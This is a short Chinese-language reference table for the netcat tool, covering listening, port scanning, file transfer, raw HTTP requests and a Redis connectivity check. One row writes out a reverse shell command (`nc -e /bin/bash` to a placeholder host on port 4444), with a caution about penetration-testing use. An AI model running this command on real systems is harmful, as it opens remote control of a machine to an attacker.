`nc` 是 **Netcat** 的缩写，被称为网络工具中的 "瑞士军刀"，用于 **TCP/UDP 网络连接读写**

### 核心功能

|功能分类|命令示例|说明|
|---|---|---|
|**端口监听**|`nc -l 1234`|监听本地 TCP 1234 端口（`-l` 表示监听）|
|**端口扫描**|`nc -zv example.com 20-30`|扫描目标主机的 20-30 端口（`-z` 扫描，`-v` 详细信息）|
|**数据传输**|`nc -l 1234 > file.txt`  <br>`nc host 1234 < file.txt`|从远程主机接收文件 → 发送文件|
|**HTTP 请求**|`printf "GET / HTTP/1.0\r\n\r\n" \| nc example.com 80`|手动发送 HTTP 请求|
|**反向 Shell**|目标机: `nc -e /bin/bash host 4444`  <br>控制端: `nc -l 4444`|建立远程命令控制（⚠️ 渗透测试常用，需谨慎）|

**快速测试服务连通性**
```
echo "PING" | nc localhost 6379  # 测试 Redis 服务是否响应
```